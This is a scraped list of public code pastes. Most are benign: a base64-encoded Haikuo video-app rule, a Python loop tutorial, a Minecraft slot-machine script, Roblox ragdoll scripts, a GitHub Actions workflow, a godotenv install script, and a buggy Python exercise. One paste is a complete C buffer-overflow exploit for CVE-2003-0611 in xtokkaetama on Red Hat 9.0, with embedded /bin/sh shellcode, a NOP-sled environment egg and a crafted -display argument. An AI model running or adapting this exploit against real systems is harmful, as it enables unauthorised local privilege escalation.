AFgD89wr,邀您一起看：熊掌,xiaomianao666,JavaScript,Wednesday 7th of February 2024 10:19:33 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥熊掌@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuS6keWPo+S7pOWvvOWFpVwiLFwicGF0aFwiOlwiY2xvdWRpbXBvcnRcIixcInJ1bGVcIjpcImZ1bmN0aW9uIGNsb3VkaW1wb3J0KCkge1xcbiAgICBsZXQgcmVtb3RlZmlsZTtcXG4gICAgbGV0IGNmZ2ZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9TcmMvSnV5aW5nL2NvbmZpZy5qc29uXFxcIjtcXG4gICAgaWYgKGZpbGVFeGlzdChjZmdmaWxlKSkge1xcbiAgICAgICAgZXZhbChcXFwibGV0IEp1Y29uZmlnPVxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXCI7XFxcIik7XFxuICAgICAgICByZW1vdGVmaWxlID0gSnVjb25maWdbXFxcIuS+nei1llxcXCJdLm1hdGNoKC9odHRwKHMpPzpcXFxcL1xcXFwvLipcXFxcLy8pWzBdICsgJ1NyY0p5U2V0LmpzJztcXG4gICAgfVxcbiAgICBpZihyZW1vdGVmaWxlKXtcXG4gICAgICAgIHJlcXVpcmUocmVtb3RlZmlsZSk7XFxuICAgICAgICByZXR1cm4gSllpbXBvcnQoaW5wdXQpO1xcbiAgICB9ZWxzZXtcXG4gICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/msqHmnInnlKjov4fogZrlvbHiiJrlsI/nqIvluo/vvJ9cXFwiO1xcbiAgICB9XFxufVxcbiQuZXhwb3J0cyA9IGNsb3VkaW1wb3J0KCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkvp3otZbmlofku7ZcIixcInBhdGhcIjpcImNvbmZpZ1wiLFwicnVsZVwiOlwianM6XFxuJC5leHBvcnRzLnZlcnNpb24gPSAxMTtcIn1dLFwicGFyYW1zXCI6XCJ7XFxcImlkXFxcIjpcXFwiYnV0dG9ubWVudTJcXFwifVwiLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCLogZrlvbHiiJpcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL2VtcHR5IyNmeXBhZ2Ujbm9SZWNvcmRIaXN0b3J5IztnZXQ7VVRGLTg7e1VzZXItQWdlbnRATW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMO+8m++8myBXaW42NO+8m++8myB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDUuMC4wLjAgU2FmYXJpLzUzNy4zNn1cIixcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJmaW5kX3J1bGVcIjpcImpzOihcXG4oKSA9PiB7XFxuICAgIHJlcXVpcmUoY29uZmlnLuS+nei1lik7XFxuICAgIGppZWtvdXlpamkoKTtcXG59XFxuKSgpXCIsXCJncm91cFwiOlwi4pGh5b2x6KeG4oiaXCIsXCJ1YVwiOlwicGNcIixcInByZVJ1bGVcIjpcImlmICghY29uZmlnLuS+nei1likge1xcbiAgICAvL+i/nOeoi+S+nei1lue0ouW8leaWh+S7tuS7o+eQhuWcsOWdgOWIl+ihqFxcbiAgICBsZXQgcmVxdWlyZWxpc3QgPSBbeyB1cmw6ICdodHRwczovL2docHJveHkubmV0L2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nLCBzb3J0OiAwIH0sIHsgdXJsOiAnaHR0cHM6Ly9naC5jb24uc2gvaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLycsIHNvcnQ6IDAgfSwgeyB1cmw6ICdodHRwczovL2dpdGh1Yi5qZXZvbnMudmlwL2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8nLCBzb3J0OiAwIH1dXFxuICAgIGxldCByZXF1aXJlZmlsZSA9IFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL1NyYy9yZXF1aXJlLmpzb25cXFwiO1xcbiAgICBpZiAoZmV0Y2gocmVxdWlyZWZpbGUpKSB7XFxuICAgICAgICB0cnkge1xcbiAgICAgICAgICAgIGV2YWwoXFxcInJlcXVpcmVsaXN0PVxcXCIgKyBmZXRjaChyZXF1aXJlZmlsZSkgKyBcXFwiO1xcXCIpO1xcbiAgICAgICAgfSBjYXRjaCAoZSkgeyB9XFxuICAgIH1cXG4gICAgcmVxdWlyZWxpc3Quc29ydChmdW5jdGlvbiAoeCwgeSkge1xcbiAgICAgICAgaWYgKHguc29ydCA8IHkuc29ydCkge1xcbiAgICAgICAgICAgIHJldHVybiAtMTtcXG4gICAgICAgIH0gZWxzZSBpZiAoeC5zb3J0ID4geS5zb3J0KSB7XFxuICAgICAgICAgICAgcmV0dXJuIDE7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiAwO1xcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCByZXF1aXJlbGlzdC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgdHJ5IHsgLy/ov5znqIvkvp3otZbntKLlvJVcXG4gICAgICAgICAgICByZXF1aXJlKHJlcXVpcmVsaXN0W2ldLnVybCArICdzcmM0ODU5Nzk2Mi9oay9tYXN0ZXIvcmVxdWlyZS5qcycsIHsgdGltZW91dDogMjAwMCB9KTtcXG4gICAgICAgICAgICBpZiAocmVseWZpbGUpIHtcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIHJlcXVpcmVsaXN0W2ldLnNvcnQrKztcXG4gICAgICAgICAgICBsb2coZS5tZXNzYWdlKTtcXG4gICAgICAgIH1cXG4gICAgfVxcbiAgICB3cml0ZUZpbGUocmVxdWlyZWZpbGUsIEpTT04uc3RyaW5naWZ5KHJlcXVpcmVsaXN0KSk7XFxuICAgIGluaXRDb25maWcoe1xcbiAgICAgICAg5L6d6LWWOiByZWx5ZmlsZVxcbiAgICB9KTtcXG4gICAgbGV0IGNmZ2ZpbGUgPSBcXFwiaGlrZXI6Ly9maWxlcy9ydWxlcy9TcmMvSnV5aW5nL2NvbmZpZy5qc29uXFxcIjtcXG4gICAgaWYgKGZpbGVFeGlzdChjZmdmaWxlKSkge1xcbiAgICAgICAgdHJ5IHtcXG4gICAgICAgICAgICBldmFsKFxcXCJsZXQgSnVjb25maWc9XFxcIiArIGZldGNoKGNmZ2ZpbGUpICsgXFxcIjtcXFwiKTtcXG4gICAgICAgICAgICBKdWNvbmZpZ1tcXFwi5L6d6LWWXFxcIl0gPSByZWx5ZmlsZTtcXG4gICAgICAgICAgICB3cml0ZUZpbGUoY2ZnZmlsZSwgSlNPTi5zdHJpbmdpZnkoSnVjb25maWcpKTtcXG4gICAgICAgIH0gY2F0Y2ggKGUpIHsgfVxcbiAgICB9XFxufVxcbi8vYnku5biF4oiaYOS6uuaJjSDogZrlvbHmqKHmnb/vvIFcIixcInBhZ2VzXCI6XCJbe1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5LqR5Y+j5Luk5a+85YWlXFxcIixcXFwicGF0aFxcXCI6XFxcImNsb3VkaW1wb3J0XFxcIixcXFwicnVsZVxcXCI6XFxcImZ1bmN0aW9uIGNsb3VkaW1wb3J0KCkge1xcXFxuICAgIGxldCByZW1vdGVmaWxlO1xcXFxuICAgIGxldCBjZmdmaWxlID0gXFxcXFxcXCJoaWtlcjovL2ZpbGVzL3J1bGVzL1NyYy9KdXlpbmcvY29uZmlnLmpzb25cXFxcXFxcIjtcXFxcbiAgICBpZiAoZmlsZUV4aXN0KGNmZ2ZpbGUpKSB7XFxcXG4gICAgICAgIGV2YWwoXFxcXFxcXCJsZXQgSnVjb25maWc9XFxcXFxcXCIgKyBmZXRjaChjZmdmaWxlKSArIFxcXFxcXFwiO1xcXFxcXFwiKTtcXFxcbiAgICAgICAgcmVtb3RlZmlsZSA9IEp1Y29uZmlnW1xcXFxcXFwi5L6d6LWWXFxcXFxcXCJdLm1hdGNoKC9odHRwKHMpPzpcXFxcXFxcXC9cXFxcXFxcXC8uKlxcXFxcXFxcLy8pWzBdICsgJ1NyY0p5U2V0LmpzJztcXFxcbiAgICB9XFxcXG4gICAgaWYocmVtb3RlZmlsZSl7XFxcXG4gICAgICAgIHJlcXVpcmUocmVtb3RlZmlsZSk7XFxcXG4gICAgICAgIHJldHVybiBKWWltcG9ydChpbnB1dCk7XFxcXG4gICAgfWVsc2V7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5rKh5pyJ55So6L+H6IGa5b2x4oia5bCP56iL5bqP77yfXFxcXFxcXCI7XFxcXG4gICAgfVxcXFxufVxcXFxuJC5leHBvcnRzID0gY2xvdWRpbXBvcnQoKTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkvp3otZbmlofku7ZcXFwiLFxcXCJwYXRoXFxcIjpcXFwiY29uZmlnXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuJC5leHBvcnRzLnZlcnNpb24gPSAxMTtcXFwifV1cIn0iLCJwaWNVcmwiOiJodHRwczovL2hpa2VyZmFucy5jb20vdHViaWFvL21vcmUvMTA1LnBuZyIsInRpdGxlIjoi54aK5o6MIn0=
0tD6ivJ0,邀您一起看：仙府御兽,xiaomianao666,JavaScript,Wednesday 7th of February 2024 10:15:46 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥仙府御兽@@
ha8Bnm5z,"Break, continue e pass em Python",jacknpoe,Python,Wednesday 7th of February 2024 09:42:11 AM CDT,"# break
def exemplo_break(numero):
    for temp in range(1,numero):
        if temp == 5:
            break
        print(temp)


# continue
def exemplo_continue(numero):
    for temp in range(1,numero):
        if temp == 5:
            continue
        print(temp)


#pass
def exemplo_pass(numero):
    for temp in range(1,numero):
        if temp % 2:
            pass
        else:
            print(temp)


# Main
if __name__ == '__main__':
    exemplo_break(10)
    exemplo_continue(10)
    exemplo_pass(10)
"
Wgnsb83i,casino.lua,Meaxis,Lua,Wednesday 7th of February 2024 09:24:23 AM CDT,"local itemValues = { 
	[""minecraft:diamond""] = 1
}

local iterates = {
	{
		color = ""yellow"",
		symbol = string.char(2)
	},

	{
		color = ""red"",
		symbol = string.char(3)
	},

	{
		color = ""green"",
		symbol = string.char(4)
	},

	{
		color = ""purple"",
		symbol = string.char(15)
	},

	{
		color = ""cyan"",
		symbol = string.char(11)
	},

	{
		color = ""pink"",
		symbol = string.char(12)
	},
}

current_line = 1
monitor = peripheral.find(""monitor"")
monitor.setTextScale(0.5)

speaker = peripheral.find(""speaker"")

local b = string.char(127)

function Split(s, delimiter)
    result = {};
    for match in (s..delimiter):gmatch(""(.-)""..delimiter) do
        table.insert(result, match);
	end
        
	return result;
end

local function centerText(text)
	current_line = current_line + 1
	monitor.setCursorPos(0,current_line)

	local trueStr = """"
	for i, v in pairs(Split(text, ""<clr>"")) do
    	if i%2 == 1 then
        	trueStr = trueStr..v
    	end
	end

	local shouldContinue = false
	for i, v in pairs(Split(text, ""<clr>"")) do
    	if i%2 == 1 then
        	monitor.write(v)
    	else
        	term.setTextColor(colors[v])
    	end
	end
end

function printCasiwow()
	centerText("" <clr>orange<clr>=<clr>yellow<clr>=<clr>red<clr>! <clr>yellow<clr>CASIWOW <clr>red<clr>!<clr>yellow<clr>=<clr>orange<clr>="")
end

function runWelcome()
	term.clear()
	current_line = 1

	local chest_contents = {peripheral.find(""inventory"")}
	chest_contents = chest_contents[1].list()
	local totalValue = 0

	for i, v in pairs(chest_contents) do
		totalValue = totalValue + (itemValues[v['name']] or 0)
	end

	
	monitor.setTextColor(colors.yellow)
	centerText("""")
	centerText("""")
	centerText("" <clr>blue<clr>Your bet: <clr>cyan<clr>""..tostring(totalValue))
	centerText("" <clr>green<clr>To get started"")
	centerText("" <clr>lime<clr>press the button"")

	sleep(1)
	monitor.clear()
	current_line = 1

	printCasiwow()
	centerText("" <clr>pink<clr>> Let's GOOO! <"")

	local iterate_counts = { [1] = math.random(1, #iterates), [2] = math.random(1, #iterates), [3] = math.random(1, #iterates) }
	local stopped = { [1] = false, [2] = false, [3] = false }	

	for i = 1, 150 do
		for i3, v in pairs(iterate_counts) do
			if not stopped[i3] then
				v = v+math.random(1, 3)
				if v > #iterates then
					v = v-#iterates
				end

				iterate_counts[i3] = v
			end
		end

		if i > 80 and math.random(1,4) == 2 then
			stopped[1] = true
			speaker.playSound(""block.lever.click"", 0.4)
			speaker.playSound(""entity.player.levelup"", 0.4)
		end

		if i > 120 and math.random(1,4) == 2 then
			stopped[2] = true
			speaker.playSound(""block.lever.click"", 0.4)
			speaker.playSound(""entity.player.levelup"", 0.4)
		end

		for i2 = 5, 7 do
			monitor.setCursorPos(1,i2)
			
			for i3, v in pairs(iterate_counts) do
				local iterateval = iterates[v]
				monitor.setTextColor(colors[iterateval[""color""]])
				monitor.write(b..iterateval[""symbol""]..iterateval[""symbol""]..iterateval[""symbol""]..b)
			end
		end

		speaker.playSound(""entity.experience_orb.pickup"", 0.4)

		sleep(0.1)
	end

	monitor.setCursorPos(1,9)

	if iterate_counts[1] == iterate_counts[2] and iterate_counts[2] == iterate_counts[3] then
		monitor.setTextColor(colors.yellow)
		monitor.write(b..b..b..b.. "" JACKPOT "" ..b..b..b..b)
		speaker.playSound(""entity.villager.celebrate"", 0.4)
	else
		monitor.setTextColor(colors.red)
		monitor.write(b..b.. "" YOU LOSE! "" ..b..b)
		speaker.playSound(""entity.villager.no"", 0.4)
	end
end

runWelcome()
"
czUnayX0,RAGDOLL Pressing KEY in Roblox Studio. LOCALSCRIPT,Joriangames,Lua,Wednesday 7th of February 2024 09:19:48 AM CDT,"-- RAGDOLL with PRESSING KEY by BLOXIANCODE youtube.com/c/BloxianCode
-- Tutorial: https://youtu.be/zycVpt-ClEQ

local UIS = game:GetService(""UserInputService"")
local RepStor = game.ReplicatedStorage
local isRagdoll = false

UIS.InputBegan:Connect(function(key, inChat)
	if inChat then return end
	if key.KeyCode == Enum.KeyCode.R then --if player pressed R
		if not isRagdoll then
			RepStor.RagdollEvent:FireServer(""go"")
			wait(.5)
			isRagdoll = true
		else
			RepStor.RagdollEvent:FireServer(""stop"")
			wait(.5)
			isRagdoll = false
		end
	end
end)
"
ZLXDP6ZA,RAGDOLL Pressing KEY in Roblox Studio. SCRIPT,Joriangames,Lua,Wednesday 7th of February 2024 09:18:14 AM CDT,"-- RAGDOLL with PRESSING KEY by BLOXIANCODE youtube.com/c/BloxianCode
-- Tutorial: https://youtu.be/zycVpt-ClEQ

local RagdollEvent = game.ReplicatedStorage.RagdollEvent

RagdollEvent.OnServerEvent:Connect(function(player, input)
	if input == ""go"" then
		for i, v in pairs(player.Character:GetDescendants()) do
			if v:IsA(""Motor6D"") and v.Parent.Name ~= ""HumanoidRootPart"" then
				local Socket = Instance.new(""BallSocketConstraint"")
				local a1 = Instance.new(""Attachment"")
				local a2 = Instance.new(""Attachment"")
				a1.Parent = v.Part0
				a2.Parent = v.Part1
				Socket.Parent = v.Parent
				Socket.Attachment0 = a1
				Socket.Attachment1 = a2
				a1.CFrame = v.C0
				a2.CFrame = v.C1
				Socket.LimitsEnabled = true
				Socket.TwistLimitsEnabled = true
				v:Destroy()
			end
		end
		player.Character.Humanoid.RequiresNeck = false
		player.Character.Humanoid.Sit = true
		
	else
		
		for i,v in pairs(player.Character:GetDescendants()) do
			if v:IsA(""BallSocketConstraint"") then
				v.UpperAngle = 0
				v.TwistUpperAngle = 0
				v.TwistLowerAngle = 0
				local Joints = Instance.new(""Motor6D"",v.Parent)
				Joints.Part0 = v.Attachment0.Parent
				Joints.Part1 = v.Attachment1.Parent
				Joints.C0 = v.Attachment0.CFrame
				Joints.C1 = v.Attachment1.CFrame
				v:Destroy()
			end
		end
		player.Character.Humanoid.Sit = false
	end
end)"
HxVbYpY8,Untitled,dvjsharma,YAML,Wednesday 7th of February 2024 09:12:42 AM CDT,"name: Swagger API Updated

on:
  pull_request:
    branches: [ ""main"" ]
  workflow_dispatch:

jobs:

  doc-diff:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3

    - name: Set up Go
      uses: actions/setup-go@v4
      with:
        go-version: '1.20'
        check-latest: true
        cache: true

    - name: Install swag
      run: |
        go install github.com/swaggo/swag/cmd/swag@latest

    - name: Build Swagger documents
      run: |
        swag init --generalInfo api.go --dir ./pkg/api,./pkg/auth,./pkg/db,./pkg/models,./pkg/utils --output ./swag/docs

    - name: Check doc diff
      run: |
        diff swag/docs/docs.go cmd/laas/docs/docs.go > swagger-diff.txt
        # Check if file swagger-diff.txt is empty
        if [ -s swagger-diff.txt ]
        then
          # If file is not empty, echo a message and exit 1
          echo ""Swagger docs are not up to date. Please run 'swag init' and commit the changes.""
          exit 1
        fi

  doc-fmt:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.20'
          check-latest: true
          cache: true

      - name: Install swag
        run: |
          go install github.com/swaggo/swag/cmd/swag@latest

      - name: Format Swagger documents
        run: |
          swag fmt --generalInfo ./pkg/api/api.go --dir ./pkg/api,./pkg/auth,./pkg/db,./pkg/models,./pkg/utils

      - name: Check file diff
        run: |
          git diff --exit-code"
SJpVw8mn,Manage godotenv,Justman10000,Bash,Wednesday 7th of February 2024 09:11:05 AM CDT,"// To install
# You need Go (https://pastebin.com/qFQRy0FX)

mkdir /home/godotenv
cd /home/godotenv
git init
git pull https://github.com/joho/godotenv
cd cmd/godotenv
go build -o godotenv
mv godotenv /usr/bin
rm -r /home/godotenv

// To uninstall
rm -r /usr/bin/godotenv"
HksDPytp,xtokkaetama 1.0b (RedHat 9.0) - Local Game - CVE-2003-0611,FlyFar,C,Wednesday 7th of February 2024 08:52:14 AM CDT,"/*
*  xtokkaetama 1.0b local game exploit on Red Hat 9.0
*               Coded by brahma (31/07/2003)
*
*       http://www.debian.org/security/2003/dsa-356
*/


#include <stdlib.h>
#define RETADDR 0xbfffff11 
#define DEFAULT_BUFFER_SIZE 29
#define DEFAULT_EGG_SIZE 512 
#define NOP 0x90
#define BIN ""/usr/X11R6/bin/xtokkaetama"" 
char shellcode[] =
""\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""
""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""
""\x80\xe8\xdc\xff\xff\xff/bin/sh"";

unsigned long get_esp(void) {
__asm__(""movl %esp,%eax"");
}

void main(int argc, char *argv[]) {
char *buff, *ptr, *egg;
long *addr_ptr, addr;
int bsize=DEFAULT_BUFFER_SIZE;
int i, eggsize=DEFAULT_EGG_SIZE;

if (argc > 1) bsize = atoi(argv[1]);
if (argc > 2) eggsize = atoi(argv[2]);


if (!(buff = malloc(bsize))) {
printf(""Can't allocate memory.\n"");
exit(0);
}
if (!(egg = malloc(eggsize))) {
printf(""Can't allocate memory.\n"");
exit(0);
}

addr = RETADDR; 
printf(""Using address: 0x%x\n"", addr);

ptr = buff;
addr_ptr = (long *) ptr;
for (i = 0; i < bsize; i+=4)
*(addr_ptr++) = addr;

ptr = egg;
for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
*(ptr++) = NOP;

for (i = 0; i < strlen(shellcode); i++)
*(ptr++) = shellcode[i];

buff[bsize - 1] = '\0';
egg[eggsize - 1] = '\0';

memcpy(egg,""EGG="",4);
putenv(egg);
execl(BIN,BIN,""-display"",buff,NULL);
}



// milw0rm.com [2003-08-01]
            "
X0FwTvyj,Untitled,Farz0l1x,Python,Wednesday 7th of February 2024 08:29:24 AM CDT,"def pov(A):
    P = []
    n = 0
    for i in range(1, len(A)):
        if A[i] == A[i-1]:
            n = A[i]
            break
        
        
    if n != 0:
        for j in range(len(A)):
            if A[j] == n:
                P.append(A[i])
            if len(P) == 3 and len(set(A)) - len(P) == 0:
                return n
            else:
                return False
    else:
        return False
file = open(""in.txt"")
count = 0
N = []
for elem in file:
    A = list(map(int, elem.split()))
    n = 0
    A.sort()
    if pov(A) != False:
        for i in range(len(A)):
            if A[i] != pov(A):
                N.append(A[i])
    if sum(N) / 3 <= pov(A) * 3:
        count += 1
print(count)"
